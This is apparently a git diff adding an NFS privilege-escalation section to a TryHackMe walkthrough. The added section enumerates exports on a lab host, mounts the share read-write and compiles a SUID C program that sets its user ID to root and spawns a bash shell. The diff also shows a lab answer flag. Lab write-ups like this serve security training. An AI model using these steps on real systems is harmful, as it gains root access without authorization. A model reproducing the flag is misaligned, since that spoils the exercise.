@@ -355,15 +355,53 @@ now enable the script
 | --- | --- |
 | Answer | THM-736628929 |
 
+## Privilege Escalation: NFS
 
+enumerate mountable shares from our attack machine
 
+```
+showmount -e 10.10.226.120
+```
 
+![image](https://user-images.githubusercontent.com/90561566/197327648-7b613574-16c9-4da8-b532-7d17be695b8b.png)
 
+```
+cat /etc/exports
+```
 
+![image](https://user-images.githubusercontent.com/90561566/197327716-28a1c444-8766-462c-8491-0f087a65abb3.png)
 
+mount the shared folder to our attack machine
 
+```
+mkdir /tmp/test
+sudo mount -o rw 10.10.226.120:/home/ubuntu/sharedfolder /tmp/test
+cd /tmp/test
+```
 
+![image](https://user-images.githubusercontent.com/90561566/197327915-4b534b03-6f3a-49ee-b1bb-ca3a1fc6b906.png)
 
+```
+vi nfs.c
+```
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+   setgid(0);
+   setuid(0);
+   system("/bin/bash");
+   return 0;
+}
+```
+
+```
+gcc nfs.c -o nfs -w
+chmod +s nfs
+```
 
 
 
